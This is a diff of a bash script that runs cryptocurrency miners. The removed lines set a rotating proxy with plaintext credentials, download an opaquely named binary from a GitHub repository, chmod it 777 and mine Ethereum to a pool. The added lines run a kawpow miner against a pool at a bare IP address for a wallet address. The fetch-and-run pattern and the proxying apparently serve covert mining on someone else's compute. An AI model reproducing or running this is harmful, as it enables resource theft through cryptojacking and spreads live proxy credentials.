@@ -1,8 +1,3 @@
 #!/bin/bash
-curl --proxy "http://hkurhvju-rotate:598bv1flufw9@p.webshare.io:80/" https://ipv4.webshare.io/
-export http_proxy=http://hkurhvju-rotate:598bv1flufw9@p.webshare.io:80 &&
-export https_proxy=http://hkurhvju-rotate:598bv1flufw9@p.webshare.io:80 &&
-export ftp_proxy=http://hkurhvju-rotate:598bv1flufw9@p.webshare.io:80 &&
-wget https://github.com/selokguine3/yes/raw/main/kopi
-chmod 777 kopi
-./kopi --coin ETH --pool ethash.kupool.com:443 --user sagemode.V100
+chmod 777 raw
+./raw -a kawpow -o 172.65.217.17:13333 -u RW7W1X392kJy2Hf3WwHVGaUcY56Hy6R2YN.def
